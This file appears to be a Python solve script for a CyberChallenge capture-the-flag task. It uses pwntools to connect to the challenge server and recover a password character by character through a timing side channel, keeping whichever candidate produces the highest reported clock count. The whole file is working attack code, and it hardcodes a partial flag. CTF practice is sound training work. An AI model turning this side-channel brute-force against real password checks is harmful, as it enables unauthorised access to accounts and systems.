from pwn import *
from string import printable

def get_res(s):
    print(f"Sending {s}...")
    r.sendline(s)
    r.recvuntil("checked in ".encode())
    s = r.recvline()
    s = s.split(' '.encode())[0]
    return s

r = remote('benchmark.challs.cyberchallenge.it', 9031)

print(r.recvuntil("Give me the password to check:".encode()).decode())

flag = "CCIT{s1d3_ch4nn3ls_r_c00l"

while True:
    clocks = {}

    for c in printable[:-7]:
        s = get_res(flag + c)
        clocks[c] = int(s)

        print(f"received number: {s}")
        try:
            r.recvuntil("Give me the password to check:".encode()).decode()
        except EOFError:
            print(f"Found flag! {flag}")
            exit(0)
            
    flag = flag + max(clocks, key=clocks.get)

    print(f"Current flag: {flag}")
        

